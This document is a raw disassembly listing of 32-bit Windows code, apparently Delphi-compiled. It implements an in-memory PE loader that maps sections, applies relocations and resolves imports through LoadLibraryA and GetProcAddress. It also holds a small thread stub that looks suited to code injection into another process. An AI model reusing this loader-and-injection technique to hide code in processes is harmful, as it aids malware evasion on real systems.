  404f80:	65 6c                	gs insb (%dx),%es:(%edi)
  404f82:	33 32                	xor    (%edx),%esi
  404f84:	00 00                	add    %al,(%eax)
  404f86:	00 00                	add    %al,(%eax)
  404f88:	4c                   	dec    %esp
  404f89:	6f                   	outsl  %ds:(%esi),(%dx)
  404f8a:	61                   	popa
  404f8b:	64 4c                	fs dec %esp
  404f8d:	69 62 72 61 72 79 41 	imul   $0x41797261,0x72(%edx),%esp
  404f94:	00 00                	add    %al,(%eax)
  404f96:	00 00                	add    %al,(%eax)
  404f98:	55                   	push   %ebp
  404f99:	8b ec                	mov    %esp,%ebp
  404f9b:	83 c4 ec             	add    $0xffffffec,%esp
  404f9e:	56                   	push   %esi
  404f9f:	57                   	push   %edi
  404fa0:	8b 45 08             	mov    0x8(%ebp),%eax
  404fa3:	8b f0                	mov    %eax,%esi
  404fa5:	8d 7d ec             	lea    -0x14(%ebp),%edi
  404fa8:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404fa9:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404faa:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404fab:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404fac:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404fad:	ff 75 f8             	push   -0x8(%ebp)
  404fb0:	ff 55 f4             	call   *-0xc(%ebp)
  404fb3:	ff 75 fc             	push   -0x4(%ebp)
  404fb6:	50                   	push   %eax
  404fb7:	ff 55 f0             	call   *-0x10(%ebp)
  404fba:	50                   	push   %eax
  404fbb:	ff 55 ec             	call   *-0x14(%ebp)
  404fbe:	5f                   	pop    %edi
  404fbf:	5e                   	pop    %esi
  404fc0:	8b e5                	mov    %ebp,%esp
  404fc2:	5d                   	pop    %ebp
  404fc3:	c2 04 00             	ret    $0x4
  404fc6:	8b c0                	mov    %eax,%eax
  404fc8:	53                   	push   %ebx
  404fc9:	56                   	push   %esi
  404fca:	57                   	push   %edi
  404fcb:	55                   	push   %ebp
  404fcc:	83 c4 e8             	add    $0xffffffe8,%esp
  404fcf:	8b e9                	mov    %ecx,%ebp
  404fd1:	8b fa                	mov    %edx,%edi
  404fd3:	8b d8                	mov    %eax,%ebx
  404fd5:	33 f6                	xor    %esi,%esi
  404fd7:	68 74 50 40 00       	push   $0x405074
  404fdc:	68 88 50 40 00       	push   $0x405088
  404fe1:	e8 0a fc ff ff       	call   0x404bf0
  404fe6:	50                   	push   %eax
  404fe7:	e8 0c fc ff ff       	call   0x404bf8
  404fec:	89 44 24 0c          	mov    %eax,0xc(%esp)
  404ff0:	68 94 50 40 00       	push   $0x405094
  404ff5:	68 88 50 40 00       	push   $0x405088
  404ffa:	e8 f1 fb ff ff       	call   0x404bf0
  404fff:	50                   	push   %eax
  405000:	e8 f3 fb ff ff       	call   0x404bf8
  405005:	89 44 24 08          	mov    %eax,0x8(%esp)
  405009:	68 a4 50 40 00       	push   $0x4050a4
  40500e:	68 88 50 40 00       	push   $0x405088
  405013:	e8 d8 fb ff ff       	call   0x404bf0
  405018:	50                   	push   %eax
  405019:	e8 da fb ff ff       	call   0x404bf8
  40501e:	89 44 24 04          	mov    %eax,0x4(%esp)
  405022:	8b d5                	mov    %ebp,%edx
  405024:	8b c3                	mov    %ebx,%eax
  405026:	e8 31 fd ff ff       	call   0x404d5c
  40502b:	89 44 24 14          	mov    %eax,0x14(%esp)
  40502f:	8b d7                	mov    %edi,%edx
  405031:	8b c3                	mov    %ebx,%eax
  405033:	e8 24 fd ff ff       	call   0x404d5c
  405038:	89 44 24 10          	mov    %eax,0x10(%esp)
  40503c:	6a 14                	push   $0x14
  40503e:	6a 00                	push   $0x0
  405040:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  405044:	ba 98 4f 40 00       	mov    $0x404f98,%edx
  405049:	8b c3                	mov    %ebx,%eax
  40504b:	e8 cc fd ff ff       	call   0x404e1c
  405050:	8b d8                	mov    %eax,%ebx
  405052:	85 db                	test   %ebx,%ebx
  405054:	74 12                	je     0x405068
  405056:	6a ff                	push   $0xffffffff
  405058:	53                   	push   %ebx
  405059:	e8 12 fc ff ff       	call   0x404c70
  40505e:	54                   	push   %esp
  40505f:	53                   	push   %ebx
  405060:	e8 73 fb ff ff       	call   0x404bd8
  405065:	8b 34 24             	mov    (%esp),%esi
  405068:	8b c6                	mov    %esi,%eax
  40506a:	83 c4 18             	add    $0x18,%esp
  40506d:	5d                   	pop    %ebp
  40506e:	5f                   	pop    %edi
  40506f:	5e                   	pop    %esi
  405070:	5b                   	pop    %ebx
  405071:	c3                   	ret
  405072:	00 00                	add    %al,(%eax)
  405074:	47                   	inc    %edi
  405075:	65 74 4d             	gs je  0x4050c5
  405078:	6f                   	outsl  %ds:(%esi),(%dx)
  405079:	64 75 6c             	fs jne 0x4050e8
  40507c:	65 48                	gs dec %eax
  40507e:	61                   	popa
  40507f:	6e                   	outsb  %ds:(%esi),(%dx)
  405080:	64 6c                	fs insb (%dx),%es:(%edi)
  405082:	65 41                	gs inc %ecx
  405084:	00 00                	add    %al,(%eax)
  405086:	00 00                	add    %al,(%eax)
  405088:	6b 65 72 6e          	imul   $0x6e,0x72(%ebp),%esp
  40508c:	65 6c                	gs insb (%dx),%es:(%edi)
  40508e:	33 32                	xor    (%edx),%esi
  405090:	00 00                	add    %al,(%eax)
  405092:	00 00                	add    %al,(%eax)
  405094:	47                   	inc    %edi
  405095:	65 74 50             	gs je  0x4050e8
  405098:	72 6f                	jb     0x405109
  40509a:	63 41 64             	arpl   %eax,0x64(%ecx)
  40509d:	64 72 65             	fs jb  0x405105
  4050a0:	73 73                	jae    0x405115
  4050a2:	00 00                	add    %al,(%eax)
  4050a4:	45                   	inc    %ebp
  4050a5:	78 69                	js     0x405110
  4050a7:	74 54                	je     0x4050fd
  4050a9:	68 72 65 61 64       	push   $0x64616572
  4050ae:	00 00                	add    %al,(%eax)
  4050b0:	55                   	push   %ebp
  4050b1:	8b ec                	mov    %esp,%ebp
  4050b3:	83 c4 f8             	add    $0xfffffff8,%esp
  4050b6:	89 55 f8             	mov    %edx,-0x8(%ebp)
  4050b9:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4050bc:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4050bf:	e8 e4 f5 ff ff       	call   0x4046a8
  4050c4:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4050c7:	e8 e8 e9 ff ff       	call   0x403ab4
  4050cc:	33 c0                	xor    %eax,%eax
  4050ce:	55                   	push   %ebp
  4050cf:	68 35 51 40 00       	push   $0x405135
  4050d4:	64 ff 30             	push   %fs:(%eax)
  4050d7:	64 89 20             	mov    %esp,%fs:(%eax)
  4050da:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4050dd:	e8 7a f3 ff ff       	call   0x40445c
  4050e2:	40                   	inc    %eax
  4050e3:	50                   	push   %eax
  4050e4:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4050e7:	b9 01 00 00 00       	mov    $0x1,%ecx
  4050ec:	8b 15 f8 4c 40 00    	mov    0x404cf8,%edx
  4050f2:	e8 41 f5 ff ff       	call   0x404638
  4050f7:	83 c4 04             	add    $0x4,%esp
  4050fa:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4050fd:	e8 5a f3 ff ff       	call   0x40445c
  405102:	8b 55 fc             	mov    -0x4(%ebp),%edx
  405105:	8d 44 82 fc          	lea    -0x4(%edx,%eax,4),%eax
  405109:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40510c:	e8 93 e6 ff ff       	call   0x4037a4
  405111:	33 c0                	xor    %eax,%eax
  405113:	5a                   	pop    %edx
  405114:	59                   	pop    %ecx
  405115:	59                   	pop    %ecx
  405116:	64 89 10             	mov    %edx,%fs:(%eax)
  405119:	68 3c 51 40 00       	push   $0x40513c
  40511e:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405121:	e8 2a e6 ff ff       	call   0x403750
  405126:	8d 45 fc             	lea    -0x4(%ebp),%eax
  405129:	8b 15 f8 4c 40 00    	mov    0x404cf8,%edx
  40512f:	e8 10 f5 ff ff       	call   0x404644
  405134:	c3                   	ret
  405135:	e9 8a e0 ff ff       	jmp    0x4031c4
  40513a:	eb e2                	jmp    0x40511e
  40513c:	59                   	pop    %ecx
  40513d:	59                   	pop    %ecx
  40513e:	5d                   	pop    %ebp
  40513f:	c3                   	ret
  405140:	55                   	push   %ebp
  405141:	8b ec                	mov    %esp,%ebp
  405143:	83 c4 f0             	add    $0xfffffff0,%esp
  405146:	53                   	push   %ebx
  405147:	56                   	push   %esi
  405148:	57                   	push   %edi
  405149:	8b da                	mov    %edx,%ebx
  40514b:	85 db                	test   %ebx,%ebx
  40514d:	78 07                	js     0x405156
  40514f:	8b 34 98             	mov    (%eax,%ebx,4),%esi
  405152:	4b                   	dec    %ebx
  405153:	56                   	push   %esi
  405154:	79 f9                	jns    0x40514f
  405156:	8b c4                	mov    %esp,%eax
  405158:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  40515b:	89 55 f8             	mov    %edx,-0x8(%ebp)
  40515e:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405161:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  405164:	41                   	inc    %ecx
  405165:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405168:	8b 15 00 10 40 00    	mov    0x401000,%edx
  40516e:	e8 b1 ed ff ff       	call   0x403f24
  405173:	8b 45 f4             	mov    -0xc(%ebp),%eax
  405176:	e8 39 e9 ff ff       	call   0x403ab4
  40517b:	33 c0                	xor    %eax,%eax
  40517d:	55                   	push   %ebp
  40517e:	68 ee 51 40 00       	push   $0x4051ee
  405183:	64 ff 30             	push   %fs:(%eax)
  405186:	64 89 20             	mov    %esp,%fs:(%eax)
  405189:	c6 45 f3 00          	movb   $0x0,-0xd(%ebp)
  40518d:	8b 75 f8             	mov    -0x8(%ebp),%esi
  405190:	46                   	inc    %esi
  405191:	4e                   	dec    %esi
  405192:	85 f6                	test   %esi,%esi
  405194:	7c 30                	jl     0x4051c6
  405196:	46                   	inc    %esi
  405197:	33 ff                	xor    %edi,%edi
  405199:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  40519c:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40519f:	e8 20 e9 ff ff       	call   0x403ac4
  4051a4:	50                   	push   %eax
  4051a5:	8b 03                	mov    (%ebx),%eax
  4051a7:	e8 18 e9 ff ff       	call   0x403ac4
  4051ac:	50                   	push   %eax
  4051ad:	e8 d6 fa ff ff       	call   0x404c88
  4051b2:	85 c0                	test   %eax,%eax
  4051b4:	75 09                	jne    0x4051bf
  4051b6:	8b 45 08             	mov    0x8(%ebp),%eax
  4051b9:	89 38                	mov    %edi,(%eax)
  4051bb:	c6 45 f3 01          	movb   $0x1,-0xd(%ebp)
  4051bf:	47                   	inc    %edi
  4051c0:	83 c3 04             	add    $0x4,%ebx
  4051c3:	4e                   	dec    %esi
  4051c4:	75 d6                	jne    0x40519c
  4051c6:	33 c0                	xor    %eax,%eax
  4051c8:	5a                   	pop    %edx
  4051c9:	59                   	pop    %ecx
  4051ca:	59                   	pop    %ecx
  4051cb:	64 89 10             	mov    %edx,%fs:(%eax)
  4051ce:	68 f5 51 40 00       	push   $0x4051f5
  4051d3:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4051d6:	e8 75 e5 ff ff       	call   0x403750
  4051db:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4051de:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4051e1:	41                   	inc    %ecx
  4051e2:	8b 15 00 10 40 00    	mov    0x401000,%edx
  4051e8:	e8 03 ec ff ff       	call   0x403df0
  4051ed:	c3                   	ret
  4051ee:	e9 d1 df ff ff       	jmp    0x4031c4
  4051f3:	eb de                	jmp    0x4051d3
  4051f5:	8a 45 f3             	mov    -0xd(%ebp),%al
  4051f8:	8b 7d e4             	mov    -0x1c(%ebp),%edi
  4051fb:	8b 75 e8             	mov    -0x18(%ebp),%esi
  4051fe:	8b 5d ec             	mov    -0x14(%ebp),%ebx
  405201:	8b e5                	mov    %ebp,%esp
  405203:	5d                   	pop    %ebp
  405204:	c2 04 00             	ret    $0x4
  405207:	90                   	nop
  405208:	33 d2                	xor    %edx,%edx
  40520a:	a9 00 00 00 04       	test   $0x4000000,%eax
  40520f:	74 06                	je     0x405217
  405211:	81 ca 00 02 00 00    	or     $0x200,%edx
  405217:	a9 00 00 00 20       	test   $0x20000000,%eax
  40521c:	74 2d                	je     0x40524b
  40521e:	a9 00 00 00 40       	test   $0x40000000,%eax
  405223:	74 11                	je     0x405236
  405225:	a9 00 00 00 80       	test   $0x80000000,%eax
  40522a:	74 05                	je     0x405231
  40522c:	83 ca 40             	or     $0x40,%edx
  40522f:	eb 41                	jmp    0x405272
  405231:	83 ca 20             	or     $0x20,%edx
  405234:	eb 3c                	jmp    0x405272
  405236:	a9 00 00 00 80       	test   $0x80000000,%eax
  40523b:	74 08                	je     0x405245
  40523d:	81 ca 80 00 00 00    	or     $0x80,%edx
  405243:	eb 2d                	jmp    0x405272
  405245:	83 ca 10             	or     $0x10,%edx
  405248:	8b c2                	mov    %edx,%eax
  40524a:	c3                   	ret
  40524b:	a9 00 00 00 40       	test   $0x40000000,%eax
  405250:	74 11                	je     0x405263
  405252:	a9 00 00 00 80       	test   $0x80000000,%eax
  405257:	74 05                	je     0x40525e
  405259:	83 ca 04             	or     $0x4,%edx
  40525c:	eb 14                	jmp    0x405272
  40525e:	83 ca 02             	or     $0x2,%edx
  405261:	eb 0f                	jmp    0x405272
  405263:	a9 00 00 00 80       	test   $0x80000000,%eax
  405268:	74 05                	je     0x40526f
  40526a:	83 ca 08             	or     $0x8,%edx
  40526d:	eb 03                	jmp    0x405272
  40526f:	83 ca 01             	or     $0x1,%edx
  405272:	8b c2                	mov    %edx,%eax
  405274:	c3                   	ret
  405275:	8d 40 00             	lea    0x0(%eax),%eax
  405278:	55                   	push   %ebp
  405279:	8b ec                	mov    %esp,%ebp
  40527b:	83 c4 f8             	add    $0xfffffff8,%esp
  40527e:	53                   	push   %ebx
  40527f:	56                   	push   %esi
  405280:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405283:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405286:	8b 55 08             	mov    0x8(%ebp),%edx
  405289:	8b 52 fc             	mov    -0x4(%edx),%edx
  40528c:	8b 92 a4 00 00 00    	mov    0xa4(%edx),%edx
  405292:	89 55 f8             	mov    %edx,-0x8(%ebp)
  405295:	eb 3c                	jmp    0x4052d3
  405297:	8b 48 04             	mov    0x4(%eax),%ecx
  40529a:	83 e9 08             	sub    $0x8,%ecx
  40529d:	d1 e9                	shr    $1,%ecx
  40529f:	83 c2 08             	add    $0x8,%edx
  4052a2:	49                   	dec    %ecx
  4052a3:	85 c9                	test   %ecx,%ecx
  4052a5:	72 2a                	jb     0x4052d1
  4052a7:	41                   	inc    %ecx
  4052a8:	f6 42 01 f0          	testb  $0xf0,0x1(%edx)
  4052ac:	74 1d                	je     0x4052cb
  4052ae:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4052b1:	8b 5b f4             	mov    -0xc(%ebx),%ebx
  4052b4:	03 18                	add    (%eax),%ebx
  4052b6:	66 8b 32             	mov    (%edx),%si
  4052b9:	66 81 e6 ff 0f       	and    $0xfff,%si
  4052be:	0f b7 f6             	movzwl %si,%esi
  4052c1:	03 de                	add    %esi,%ebx
  4052c3:	8b 75 08             	mov    0x8(%ebp),%esi
  4052c6:	8b 76 f8             	mov    -0x8(%esi),%esi
  4052c9:	01 33                	add    %esi,(%ebx)
  4052cb:	83 c2 02             	add    $0x2,%edx
  4052ce:	49                   	dec    %ecx
  4052cf:	75 d7                	jne    0x4052a8
  4052d1:	8b c2                	mov    %edx,%eax
  4052d3:	8b d0                	mov    %eax,%edx
  4052d5:	8b ca                	mov    %edx,%ecx
  4052d7:	2b 4d fc             	sub    -0x4(%ebp),%ecx
  4052da:	3b 4d f8             	cmp    -0x8(%ebp),%ecx
  4052dd:	72 b8                	jb     0x405297
  4052df:	5e                   	pop    %esi
  4052e0:	5b                   	pop    %ebx
  4052e1:	59                   	pop    %ecx
  4052e2:	59                   	pop    %ecx
  4052e3:	5d                   	pop    %ebp
  4052e4:	c3                   	ret
  4052e5:	8d 40 00             	lea    0x0(%eax),%eax
  4052e8:	a9 00 00 00 80       	test   $0x80000000,%eax
  4052ed:	0f 95 c0             	setne  %al
  4052f0:	c3                   	ret
  4052f1:	8d 40 00             	lea    0x0(%eax),%eax
  4052f4:	55                   	push   %ebp
  4052f5:	8b ec                	mov    %esp,%ebp
  4052f7:	83 c4 e8             	add    $0xffffffe8,%esp
  4052fa:	53                   	push   %ebx
  4052fb:	56                   	push   %esi
  4052fc:	33 d2                	xor    %edx,%edx
  4052fe:	89 55 e8             	mov    %edx,-0x18(%ebp)
  405301:	89 55 ec             	mov    %edx,-0x14(%ebp)
  405304:	89 55 f0             	mov    %edx,-0x10(%ebp)
  405307:	33 d2                	xor    %edx,%edx
  405309:	55                   	push   %ebp
  40530a:	68 22 54 40 00       	push   $0x405422
  40530f:	64 ff 32             	push   %fs:(%edx)
  405312:	64 89 22             	mov    %esp,%fs:(%edx)
  405315:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405318:	e9 dc 00 00 00       	jmp    0x4053f9
  40531d:	8b 55 08             	mov    0x8(%ebp),%edx
  405320:	03 42 f4             	add    -0xc(%edx),%eax
  405323:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405326:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405329:	50                   	push   %eax
  40532a:	8b 45 08             	mov    0x8(%ebp),%eax
  40532d:	8b 58 f0             	mov    -0x10(%eax),%ebx
  405330:	8b c3                	mov    %ebx,%eax
  405332:	e8 2d f1 ff ff       	call   0x404464
  405337:	50                   	push   %eax
  405338:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40533b:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40533e:	e8 2d e5 ff ff       	call   0x403870
  405343:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  405346:	8b 45 08             	mov    0x8(%ebp),%eax
  405349:	8b c3                	mov    %ebx,%eax
  40534b:	5a                   	pop    %edx
  40534c:	e8 ef fd ff ff       	call   0x405140
  405351:	84 c0                	test   %al,%al
  405353:	75 32                	jne    0x405387
  405355:	8d 45 ec             	lea    -0x14(%ebp),%eax
  405358:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40535b:	e8 10 e5 ff ff       	call   0x403870
  405360:	8b 55 ec             	mov    -0x14(%ebp),%edx
  405363:	8b 45 08             	mov    0x8(%ebp),%eax
  405366:	8b 40 dc             	mov    -0x24(%eax),%eax
  405369:	e8 56 fb ff ff       	call   0x404ec4
  40536e:	8d 45 e8             	lea    -0x18(%ebp),%eax
  405371:	8b 55 f8             	mov    -0x8(%ebp),%edx
  405374:	e8 f7 e4 ff ff       	call   0x403870
  405379:	8b 55 e8             	mov    -0x18(%ebp),%edx
  40537c:	8b 45 08             	mov    0x8(%ebp),%eax
  40537f:	8b 40 f0             	mov    -0x10(%eax),%eax
  405382:	e8 29 fd ff ff       	call   0x4050b0
  405387:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40538a:	83 78 04 00          	cmpl   $0x0,0x4(%eax)
  40538e:	75 0e                	jne    0x40539e
  405390:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405393:	8b 58 10             	mov    0x10(%eax),%ebx
  405396:	8b 45 08             	mov    0x8(%ebp),%eax
  405399:	03 58 f4             	add    -0xc(%eax),%ebx
  40539c:	eb 51                	jmp    0x4053ef
  40539e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4053a1:	8b 18                	mov    (%eax),%ebx
  4053a3:	8b 45 08             	mov    0x8(%ebp),%eax
  4053a6:	03 58 f4             	add    -0xc(%eax),%ebx
  4053a9:	eb 44                	jmp    0x4053ef
  4053ab:	8b c6                	mov    %esi,%eax
  4053ad:	e8 36 ff ff ff       	call   0x4052e8
  4053b2:	84 c0                	test   %al,%al
  4053b4:	74 18                	je     0x4053ce
  4053b6:	8b 0b                	mov    (%ebx),%ecx
  4053b8:	81 e1 ff ff 00 00    	and    $0xffff,%ecx
  4053be:	8b 45 08             	mov    0x8(%ebp),%eax
  4053c1:	8b 40 dc             	mov    -0x24(%eax),%eax
  4053c4:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4053c7:	e8 fc fb ff ff       	call   0x404fc8
  4053cc:	eb 1c                	jmp    0x4053ea
  4053ce:	8b 45 08             	mov    0x8(%ebp),%eax
  4053d1:	8b 40 f4             	mov    -0xc(%eax),%eax
  4053d4:	03 03                	add    (%ebx),%eax
  4053d6:	83 c0 02             	add    $0x2,%eax
  4053d9:	8b 55 08             	mov    0x8(%ebp),%edx
  4053dc:	8b 52 dc             	mov    -0x24(%edx),%edx
  4053df:	8b c8                	mov    %eax,%ecx
  4053e1:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4053e4:	92                   	xchg   %eax,%edx
  4053e5:	e8 de fb ff ff       	call   0x404fc8
  4053ea:	89 03                	mov    %eax,(%ebx)
  4053ec:	83 c3 04             	add    $0x4,%ebx
  4053ef:	8b 33                	mov    (%ebx),%esi
  4053f1:	85 f6                	test   %esi,%esi
  4053f3:	75 b6                	jne    0x4053ab
  4053f5:	83 45 fc 14          	addl   $0x14,-0x4(%ebp)
  4053f9:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4053fc:	8b 40 0c             	mov    0xc(%eax),%eax
  4053ff:	85 c0                	test   %eax,%eax
  405401:	0f 85 16 ff ff ff    	jne    0x40531d
  405407:	33 c0                	xor    %eax,%eax
  405409:	5a                   	pop    %edx
  40540a:	59                   	pop    %ecx
  40540b:	59                   	pop    %ecx
  40540c:	64 89 10             	mov    %edx,%fs:(%eax)
  40540f:	68 29 54 40 00       	push   $0x405429
  405414:	8d 45 e8             	lea    -0x18(%ebp),%eax
  405417:	ba 03 00 00 00       	mov    $0x3,%edx
  40541c:	e8 53 e3 ff ff       	call   0x403774
  405421:	c3                   	ret
  405422:	e9 9d dd ff ff       	jmp    0x4031c4
  405427:	eb eb                	jmp    0x405414
  405429:	5e                   	pop    %esi
  40542a:	5b                   	pop    %ebx
  40542b:	8b e5                	mov    %ebp,%esp
  40542d:	5d                   	pop    %ebp
  40542e:	c3                   	ret
  40542f:	90                   	nop
  405430:	55                   	push   %ebp
  405431:	8b ec                	mov    %esp,%ebp
  405433:	83 c4 c8             	add    $0xffffffc8,%esp
  405436:	53                   	push   %ebx
  405437:	56                   	push   %esi
  405438:	57                   	push   %edi
  405439:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  40543c:	8b da                	mov    %edx,%ebx
  40543e:	89 45 dc             	mov    %eax,-0x24(%ebp)
  405441:	8d 45 e0             	lea    -0x20(%ebp),%eax
  405444:	8b 15 2c 4d 40 00    	mov    0x404d2c,%edx
  40544a:	e8 91 e8 ff ff       	call   0x403ce0
  40544f:	33 c0                	xor    %eax,%eax
  405451:	55                   	push   %ebp
  405452:	68 2a 56 40 00       	push   $0x40562a
  405457:	64 ff 30             	push   %fs:(%eax)
  40545a:	64 89 20             	mov    %esp,%fs:(%eax)
  40545d:	8b 45 d8             	mov    -0x28(%ebp),%eax
  405460:	33 d2                	xor    %edx,%edx
  405462:	52                   	push   %edx
  405463:	50                   	push   %eax
  405464:	8b 45 d8             	mov    -0x28(%ebp),%eax
  405467:	8b 40 3c             	mov    0x3c(%eax),%eax
  40546a:	99                   	cltd
  40546b:	03 04 24             	add    (%esp),%eax
  40546e:	13 54 24 04          	adc    0x4(%esp),%edx
  405472:	83 c4 08             	add    $0x8,%esp
  405475:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405478:	6a 01                	push   $0x1
  40547a:	68 00 20 00 00       	push   $0x2000
  40547f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405482:	8b 40 50             	mov    0x50(%eax),%eax
  405485:	50                   	push   %eax
  405486:	53                   	push   %ebx
  405487:	e8 c4 f7 ff ff       	call   0x404c50
  40548c:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40548f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405492:	8b 55 f4             	mov    -0xc(%ebp),%edx
  405495:	2b 50 34             	sub    0x34(%eax),%edx
  405498:	89 55 f8             	mov    %edx,-0x8(%ebp)
  40549b:	6a 04                	push   $0x4
  40549d:	68 00 10 00 00       	push   $0x1000
  4054a2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4054a5:	8b 40 54             	mov    0x54(%eax),%eax
  4054a8:	50                   	push   %eax
  4054a9:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4054ac:	50                   	push   %eax
  4054ad:	e8 9e f7 ff ff       	call   0x404c50
  4054b2:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4054b5:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4054b8:	8b 48 54             	mov    0x54(%eax),%ecx
  4054bb:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  4054be:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4054c1:	e8 7a d4 ff ff       	call   0x402940
  4054c6:	8d 45 cc             	lea    -0x34(%ebp),%eax
  4054c9:	50                   	push   %eax
  4054ca:	6a 02                	push   $0x2
  4054cc:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4054cf:	8b 40 54             	mov    0x54(%eax),%eax
  4054d2:	50                   	push   %eax
  4054d3:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4054d6:	50                   	push   %eax
  4054d7:	e8 8c f7 ff ff       	call   0x404c68
  4054dc:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4054df:	8d 70 18             	lea    0x18(%eax),%esi
  4054e2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4054e5:	0f b7 40 14          	movzwl 0x14(%eax),%eax
  4054e9:	03 f0                	add    %eax,%esi
  4054eb:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4054ee:	0f b7 40 06          	movzwl 0x6(%eax),%eax
  4054f2:	48                   	dec    %eax
  4054f3:	85 c0                	test   %eax,%eax
  4054f5:	7c 67                	jl     0x40555e
  4054f7:	40                   	inc    %eax
  4054f8:	89 45 c8             	mov    %eax,-0x38(%ebp)
  4054fb:	33 db                	xor    %ebx,%ebx
  4054fd:	8d 04 9b             	lea    (%ebx,%ebx,4),%eax
  405500:	8b 7c c6 08          	mov    0x8(%esi,%eax,8),%edi
  405504:	8d 04 9b             	lea    (%ebx,%ebx,4),%eax
  405507:	8b 44 c6 10          	mov    0x10(%esi,%eax,8),%eax
  40550b:	89 45 d0             	mov    %eax,-0x30(%ebp)
  40550e:	3b 7d d0             	cmp    -0x30(%ebp),%edi
  405511:	73 09                	jae    0x40551c
  405513:	33 7d d0             	xor    -0x30(%ebp),%edi
  405516:	31 7d d0             	xor    %edi,-0x30(%ebp)
  405519:	33 7d d0             	xor    -0x30(%ebp),%edi
  40551c:	6a 04                	push   $0x4
  40551e:	68 00 10 00 00       	push   $0x1000
  405523:	57                   	push   %edi
  405524:	8d 04 9b             	lea    (%ebx,%ebx,4),%eax
  405527:	8b 44 c6 0c          	mov    0xc(%esi,%eax,8),%eax
  40552b:	03 45 f4             	add    -0xc(%ebp),%eax
  40552e:	50                   	push   %eax
  40552f:	e8 1c f7 ff ff       	call   0x404c50
  405534:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  405537:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40553a:	33 c9                	xor    %ecx,%ecx
  40553c:	8b d7                	mov    %edi,%edx
  40553e:	e8 69 d6 ff ff       	call   0x402bac
  405543:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  405546:	8d 04 9b             	lea    (%ebx,%ebx,4),%eax
  405549:	8b 44 c6 14          	mov    0x14(%esi,%eax,8),%eax
  40554d:	03 45 d8             	add    -0x28(%ebp),%eax
  405550:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405553:	e8 e8 d3 ff ff       	call   0x402940
  405558:	43                   	inc    %ebx
  405559:	ff 4d c8             	decl   -0x38(%ebp)
  40555c:	75 9f                	jne    0x4054fd
  40555e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405561:	8b 40 28             	mov    0x28(%eax),%eax
  405564:	03 45 f4             	add    -0xc(%ebp),%eax
  405567:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40556a:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40556d:	8b 45 f4             	mov    -0xc(%ebp),%eax
  405570:	89 45 e0             	mov    %eax,-0x20(%ebp)
  405573:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405576:	8b 40 50             	mov    0x50(%eax),%eax
  405579:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40557c:	6a 00                	push   $0x0
  40557e:	8d 45 f0             	lea    -0x10(%ebp),%eax
  405581:	b9 01 00 00 00       	mov    $0x1,%ecx
  405586:	8b 15 f8 4c 40 00    	mov    0x404cf8,%edx
  40558c:	e8 a7 f0 ff ff       	call   0x404638
  405591:	83 c4 04             	add    $0x4,%esp
  405594:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405597:	8b 80 a0 00 00 00    	mov    0xa0(%eax),%eax
  40559d:	85 c0                	test   %eax,%eax
  40559f:	74 0a                	je     0x4055ab
  4055a1:	55                   	push   %ebp
  4055a2:	03 45 f4             	add    -0xc(%ebp),%eax
  4055a5:	e8 ce fc ff ff       	call   0x405278
  4055aa:	59                   	pop    %ecx
  4055ab:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4055ae:	8b 80 80 00 00 00    	mov    0x80(%eax),%eax
  4055b4:	85 c0                	test   %eax,%eax
